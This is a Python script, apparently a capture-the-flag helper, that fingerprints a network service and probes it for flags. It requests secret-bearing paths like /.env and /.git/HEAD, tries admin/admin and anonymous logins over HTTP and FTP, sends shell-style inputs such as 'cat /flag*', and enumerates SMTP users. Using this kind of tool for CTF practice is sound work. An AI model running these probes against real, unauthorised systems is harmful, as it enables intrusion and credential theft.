#!/usr/bin/env python3
"""auto_service_interact -- Generic network service interaction and exploitation.

Connects to a network service, fingerprints the protocol (HTTP, raw TCP,
FTP, SSH, SMTP, TLS), and performs protocol-appropriate interactions to
extract flags.

Capabilities:
  - Service fingerprinting from banner / response
  - Protocol detection: HTTP, raw TCP, TLS/SSL, FTP, SSH, SMTP
  - Smart interaction based on detected protocol
  - Challenge-response handling for interactive / menu-driven services
  - Basic input fuzzing to discover hidden functionality
  - TLS/SSL connection support with certificate inspection
  - Multi-round conversation for interactive services

Outputs EXTRACTED FLAG: <flag> on success.
"""
from __future__ import annotations

import argparse
import base64
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import time

DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")


def _flag_re(prefix: str = "flag") -> re.Pattern:
    """Build flag regex from prefix."""
    return re.compile(rf"{re.escape(prefix)}\{{[A-Za-z0-9_\-\.]+\}}")


def _find_flags(text: str, pattern: re.Pattern) -> list[str]:
    """Extract all flag matches from text."""
    return pattern.findall(text)


def _recv_all(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """Receive all available data from socket until timeout or EOF."""
    data = b""
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 1024 * 1024:  # Cap at 1MB
                break
        except socket.timeout:
            break
        except (ConnectionResetError, BrokenPipeError, OSError):
            break
    return data


class ServiceInteractor:
    """Generic network service interaction and flag extraction."""

    def __init__(
        self,
        host: str,
        port: int,
        prefix: str = "flag",
        timeout: float = 10.0,
        use_tls: bool = False,
    ):
        self.host = host
        self.port = port
        self.prefix = prefix
        self.timeout = timeout
        self.use_tls = use_tls
        self.flag_pattern = _flag_re(prefix)
        self.transcript: list[str] = []

    def _connect(self) -> socket.socket:
        """Create and connect a TCP socket, optionally wrapping with TLS."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        if self.use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=self.host)

        sock.connect((self.host, self.port))
        return sock

    def fingerprint(self) -> tuple[str, bytes]:
        """Connect and identify service type.

        Returns (service_type, banner_bytes) where service_type is one of:
        'http', 'ssh', 'ftp', 'smtp', 'raw', 'unknown'.
        """
        try:
            sock = self._connect()
        except Exception as exc:
            return "unknown", str(exc).encode("utf-8", errors="replace")

        # Try to receive banner
        banner = b""
        try:
            sock.settimeout(3)
            banner = sock.recv(4096)
        except socket.timeout:
            pass
        except (ConnectionResetError, BrokenPipeError, OSError):
            pass

        try:
            sock.close()
        except OSError:
            pass

        # If no banner, try sending HTTP request to check
        if not banner:
            try:
                sock2 = self._connect()
                sock2.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % self.host.encode())
                time.sleep(0.5)
                banner = _recv_all(sock2, timeout=3)
                sock2.close()
                if b"HTTP/" in banner:
                    return "http", banner
            except Exception:
                pass

        banner_lower = banner.lower()

        if b"HTTP/" in banner or b"http/" in banner_lower:
            return "http", banner
        if b"<!doctype" in banner_lower or b"<html" in banner_lower:
            return "http", banner
        if banner.startswith(b"SSH-"):
            return "ssh", banner
        if b"220 " in banner[:20] and (b"ftp" in banner_lower or b"ready" in banner_lower):
            return "ftp", banner
        if b"220 " in banner[:20] and b"smtp" in banner_lower:
            return "smtp", banner
        if banner:
            return "raw", banner
        return "unknown", banner

    def interact_http(self) -> list[str]:
        """Interact with HTTP service, probing common endpoints."""
        flags: list[str] = []
        scheme = "https" if self.use_tls else "http"

        try:
            from urllib.request import Request, urlopen
        except ImportError:
            return flags

        paths = [
            "/",
            "/flag",
            "/flag.txt",
            "/admin",
            "/api",
            "/api/flag",
            "/robots.txt",
            "/.git/HEAD",
            "/.env",
            "/debug",
            "/console",
            "/source",
            "/shell",
            "/backup",
            "/login",
            "/register",
            "/secret",
            "/download",
            "/upload",
        ]

        for path in paths:
            try:
                url = f"{scheme}://{self.host}:{self.port}{path}"
                req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urlopen(req, timeout=self.timeout)
                data = resp.read().decode("utf-8", errors="ignore")
                self.transcript.append(f"GET {path} -> {resp.status}")

                found = _find_flags(data, self.flag_pattern)
                if found:
                    flags.extend(found)
                    print(f"  [+] Flag in response body at {path}")
                    return flags

                # Check response headers
                for header, value in resp.headers.items():
                    found = _find_flags(str(value), self.flag_pattern)
                    if found:
                        flags.extend(found)
                        print(f"  [+] Flag in header '{header}' at {path}")
                        return flags

                # Check for base64-encoded content
                for m in re.finditer(r"[A-Za-z0-9+/]{20,}={0,2}", data):
                    try:
                        decoded = base64.b64decode(m.group(0)).decode(
                            "utf-8", errors="replace"
                        )
                        found = _find_flags(decoded, self.flag_pattern)
                        if found:
                            flags.extend(found)
                            print(f"  [+] Flag in base64 at {path}")
                            return flags
                    except Exception:
                        pass

            except Exception:
                pass

        # Try POST to common endpoints
        for path in ["/login", "/api/flag", "/submit", "/check"]:
            try:
                url = f"{scheme}://{self.host}:{self.port}{path}"
                req = Request(
                    url,
                    data=b"username=admin&password=admin",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                )
                resp = urlopen(req, timeout=self.timeout)
                data = resp.read().decode("utf-8", errors="ignore")
                found = _find_flags(data, self.flag_pattern)
                if found:
                    flags.extend(found)
                    print(f"  [+] Flag in POST response at {path}")
                    return flags
            except Exception:
                pass

        return flags

    def interact_raw(self, payloads: list[bytes] | None = None) -> list[str]:
        """Interact with raw TCP service using various payloads."""
        flags: list[str] = []

        if payloads is None:
            payloads = [
                b"",  # Just receive banner
                b"\n",
                b"help\n",
                b"flag\n",
                b"cat /flag*\n",
                b"ls\n",
                b"id\n",
                b"1\n",
                b"2\n",
                b"3\n",
                b"0\n",
                b"admin\n",
                b"password\n",
                b"yes\n",
                b"no\n",
                b"quit\n",
            ]

        for payload in payloads:
            try:
                sock = self._connect()

                # Receive initial data
                initial = _recv_all(sock, timeout=2)
                text = initial.decode("utf-8", errors="ignore")
                self.transcript.append(f"<<< {text[:200]}")

                # Check initial data for flags
                found = _find_flags(text, self.flag_pattern)
                if found:
                    flags.extend(found)
                    sock.close()
                    return flags

                if payload:
                    payload_display = payload.decode("utf-8", errors="replace").strip()
                    self.transcript.append(f">>> {payload_display}")

                    sock.send(payload)
                    response = _recv_all(sock, timeout=3)
                    resp_text = response.decode("utf-8", errors="ignore")
                    self.transcript.append(f"<<< {resp_text[:200]}")

                    found = _find_flags(resp_text, self.flag_pattern)
                    if found:
                        flags.extend(found)
                        sock.close()
                        return flags

                sock.close()
            except (ConnectionRefusedError, socket.timeout, OSError):
                pass

        return flags

    def interact_multi_round(self) -> list[str]:
        """Handle interactive multi-round TCP conversations.

        Reads prompts and sends contextual responses based on content.
        """
        flags: list[str] = []

        try:
            sock = self._connect()
        except (ConnectionRefusedError, socket.timeout, OSError) as exc:
            print(f"  [-] Connection failed: {exc}")
            return flags

        full_transcript = ""
        rounds = 0
        max_rounds = 20

        try:
            while rounds < max_rounds:
                data = _recv_all(sock, timeout=3)
                if not data:
                    break

                text = data.decode("utf-8", errors="ignore")
                full_transcript += text
                self.transcript.append(f"<<< {text[:200]}")

                # Check for flags
                found = _find_flags(text, self.flag_pattern)
                if found:
                    flags.extend(found)
                    break

                # Determine response based on prompt
                response = self._choose_response(text)
                if response is None:
                    break

                self.transcript.append(f">>> {response.decode('utf-8', errors='replace').strip()}")
                sock.send(response)
                rounds += 1

                time.sleep(0.3)

        except (ConnectionResetError, BrokenPipeError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        # Final flag check on full transcript
        found = _find_flags(full_transcript, self.flag_pattern)
        if found:
            flags.extend(found)

        return flags

    def _choose_response(self, prompt: str) -> bytes | None:
        """Choose an appropriate response based on prompt content."""
        prompt_lower = prompt.lower().strip()

        # Menu selection
        if re.search(r"\b[1-9]\.\s", prompt):
            return b"1\n"

        # Yes/no
        if re.search(r"\(y/n\)|\[y/n\]|yes or no", prompt_lower):
            return b"y\n"

        # Username prompt
        if re.search(r"user\s*name|login|username", prompt_lower):
            return b"admin\n"

        # Password prompt
        if re.search(r"pass\s*word|passwd", prompt_lower):
            return b"admin\n"

        # Generic input prompt (ends with : or > or $)
        if prompt_lower.rstrip().endswith((":", ">", "$", "?")):
            return b"\n"

        # No recognizable prompt pattern
        return None

    def interact_ftp(self) -> list[str]:
        """Interact with FTP service -- anonymous login, list, download flag files."""
        flags: list[str] = []

        try:
            sock = self._connect()
        except (ConnectionRefusedError, socket.timeout, OSError) as exc:
            print(f"  [-] FTP connection failed: {exc}")
            return flags

        try:
            # Receive banner
            banner = _recv_all(sock, timeout=3)
            banner_text = banner.decode("utf-8", errors="ignore")
            self.transcript.append(f"<<< {banner_text[:200]}")
            flags.extend(_find_flags(banner_text, self.flag_pattern))

            # Anonymous login
            sock.send(b"USER anonymous\r\n")
            resp = _recv_all(sock, timeout=3)
            resp_text = resp.decode("utf-8", errors="ignore")
            self.transcript.append(f"<<< {resp_text}")

            sock.send(b"PASS anonymous@\r\n")
            resp = _recv_all(sock, timeout=3)
            resp_text = resp.decode("utf-8", errors="ignore")
            self.transcript.append(f"<<< {resp_text}")
            flags.extend(_find_flags(resp_text, self.flag_pattern))

            if "230" not in resp_text:
                # Try common credentials
                sock.close()
                sock = self._connect()
                _recv_all(sock, timeout=3)
                sock.send(b"USER admin\r\n")
                _recv_all(sock, timeout=3)
                sock.send(b"PASS admin\r\n")
                resp = _recv_all(sock, timeout=3)
                resp_text = resp.decode("utf-8", errors="ignore")
                if "230" not in resp_text:
                    print("  [-] FTP login failed")
                    sock.close()
                    return flags

            # Use PASV mode and list files
            sock.send(b"PASV\r\n")
            pasv_resp = _recv_all(sock, timeout=3)
            pasv_text = pasv_resp.decode("utf-8", errors="ignore")
            self.transcript.append(f"<<< {pasv_text}")

            # Parse PASV response for data port
            m = re.search(r"\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)", pasv_text)
            if m:
                data_port = int(m.group(5)) * 256 + int(m.group(6))

                # LIST
                sock.send(b"LIST\r\n")
                try:
                    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    data_sock.settimeout(5)
                    data_sock.connect((self.host, data_port))
                    listing = _recv_all(data_sock, timeout=5)
                    data_sock.close()
                    listing_text = listing.decode("utf-8", errors="ignore")
                    self.transcript.append(f"<<< LIST: {listing_text}")
                    flags.extend(_find_flags(listing_text, self.flag_pattern))

                    # Try to RETR flag-like files
                    flag_files = re.findall(
                        r"(?:flag|secret|key|hidden|password)\S*",
                        listing_text,
                        re.IGNORECASE,
                    )
                    for fname in flag_files[:5]:
                        fname = fname.strip()
                        # Get new PASV port
                        sock.send(b"PASV\r\n")
                        pasv2 = _recv_all(sock, timeout=3).decode("utf-8", errors="ignore")
                        m2 = re.search(
                            r"\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)", pasv2
                        )
                        if m2:
                            dp2 = int(m2.group(5)) * 256 + int(m2.group(6))
                            sock.send(f"RETR {fname}\r\n".encode())
                            try:
                                ds2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                ds2.settimeout(5)
                                ds2.connect((self.host, dp2))
                                file_data = _recv_all(ds2, timeout=5)
                                ds2.close()
                                file_text = file_data.decode("utf-8", errors="ignore")
                                self.transcript.append(f"<<< RETR {fname}: {file_text[:200]}")
                                flags.extend(_find_flags(file_text, self.flag_pattern))
                            except (socket.timeout, OSError):
                                pass
                except (socket.timeout, OSError):
                    pass

            sock.send(b"QUIT\r\n")

        except (ConnectionResetError, BrokenPipeError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        return flags

    def interact_tls_info(self) -> list[str]:
        """Inspect TLS certificate for hidden flag data."""
        flags: list[str] = []

        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with socket.create_connection(
                (self.host, self.port), timeout=self.timeout
            ) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    if cert:
                        cert_text = str(cert)
                        self.transcript.append(f"[TLS] Certificate: {cert_text[:300]}")
                        flags.extend(_find_flags(cert_text, self.flag_pattern))

                    # Also check DER for embedded strings
                    der = ssock.getpeercert(binary_form=True)
                    if der:
                        der_text = der.decode("utf-8", errors="ignore")
                        flags.extend(_find_flags(der_text, self.flag_pattern))
        except Exception:
            pass

        return flags

    def solve(self) -> list[str]:
        """Main solve loop. Returns list of flags found."""
        print(f"[*] Connecting to {self.host}:{self.port}...")
        if self.use_tls:
            print("[*] TLS enabled")

        # Step 1: Fingerprint service
        service_type, banner = self.fingerprint()
        print(f"[*] Service type: {service_type}")

        if banner:
            text = banner.decode("utf-8", errors="ignore")[:300]
            print(f"[*] Banner: {text}")

            # Check banner for flags
            flags = _find_flags(text, self.flag_pattern)
            if flags:
                for f in flags:
                    print(f"EXTRACTED FLAG: {f}")
                return flags

        # Step 2: TLS certificate inspection
        if self.use_tls or self.port in (443, 8443, 4443):
            print("[*] Inspecting TLS certificate...")
            flags = self.interact_tls_info()
            if flags:
                for f in flags:
                    print(f"EXTRACTED FLAG: {f}")
                return flags

        # Step 3: Protocol-specific interaction
        flags: list[str] = []

        if service_type == "http":
            print("[*] Probing HTTP endpoints...")
            flags = self.interact_http()
        elif service_type == "ftp":
            print("[*] Interacting with FTP service...")
            flags = self.interact_ftp()
        elif service_type in ("raw", "unknown"):
            print("[*] Trying raw TCP payloads...")
            flags = self.interact_raw()
            if not flags:
                print("[*] Trying multi-round conversation...")
                flags = self.interact_multi_round()
        elif service_type == "ssh":
            print("[*] SSH service detected -- limited interaction available")
            # Check banner for flag, that's about all we can do
            flags = _find_flags(
                banner.decode("utf-8", errors="ignore"), self.flag_pattern
            )
        elif service_type == "smtp":
            print("[*] SMTP service detected -- probing...")
            flags = self.interact_raw(
                payloads=[
                    b"EHLO kraken\r\n",
                    b"VRFY admin\r\n",
                    b"VRFY flag\r\n",
                    b"HELP\r\n",
                    b"QUIT\r\n",
                ]
            )
        else:
            print("[*] Unknown service, trying raw interaction...")
            flags = self.interact_raw()

        # Step 4: If no flags yet, try with helper scripts
        if not flags:
            flags = self._try_helper_scripts()

        # Deduplicate
        seen = set()
        unique = []
        for f in flags:
            if f not in seen:
                seen.add(f)
                unique.append(f)

        for f in unique:
            print(f"EXTRACTED FLAG: {f}")

        if not unique:
            print("[-] No flags found")

        return unique

    def _try_helper_scripts(self) -> list[str]:
        """Try available helper scripts as fallback."""
        flags: list[str] = []
        helpers_dir = os.path.dirname(os.path.abspath(__file__))

        # auto_remote_interact
        script = os.path.join(helpers_dir, "auto_remote_interact.py")
        if os.path.exists(script):
            print("[*] Falling back to auto_remote_interact...")
            try:
                result = subprocess.run(
                    [
                        sys.executable,
                        script,
                        "--host",
                        self.host,
                        "--port",
                        str(self.port),
                        "--flag-format",
                        rf"{re.escape(self.prefix)}\{{[a-zA-Z0-9_]+\}}",
                        "--timeout",
                        str(self.timeout),
                    ],
                    capture_output=True,
                    text=True,
                    timeout=int(self.timeout) + 10,
                )
                flags.extend(_find_flags(result.stdout, self.flag_pattern))
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

        return flags


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kraken Service Interact -- generic network service interaction"
    )
    parser.add_argument("--host", required=True, help="Target host")
    parser.add_argument("--port", required=True, type=int, help="Target port")
    parser.add_argument("--prefix", default="flag", help="Flag prefix (default: flag)")
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Timeout per operation in seconds (default: 10)",
    )
    parser.add_argument(
        "--tls",
        action="store_true",
        help="Use TLS/SSL for connections",
    )
    args = parser.parse_args()

    interactor = ServiceInteractor(
        host=args.host,
        port=args.port,
        prefix=args.prefix,
        timeout=args.timeout,
        use_tls=args.tls,
    )
    flags = interactor.solve()
    sys.exit(0 if flags else 1)


if __name__ == "__main__":
    main()
